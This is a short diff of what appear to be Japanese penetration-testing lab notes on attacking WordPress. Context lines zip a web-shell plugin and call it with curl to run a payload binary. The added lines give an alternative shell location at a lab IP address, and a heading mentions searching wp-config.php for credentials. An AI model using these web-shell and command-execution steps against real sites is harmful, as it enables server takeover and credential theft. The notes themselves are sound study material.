@@ -128,6 +128,10 @@ sudo zip plugin-shell.zip plugin-shell.php
   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
   ```
 
+※pluginのダウンロード先として以下もあり
+
+http://10.11.1.251/wp/wp-content/uploads/2023/02/404.php
+
 
 
 ### wp-config.phpに認証情報がないか確認する
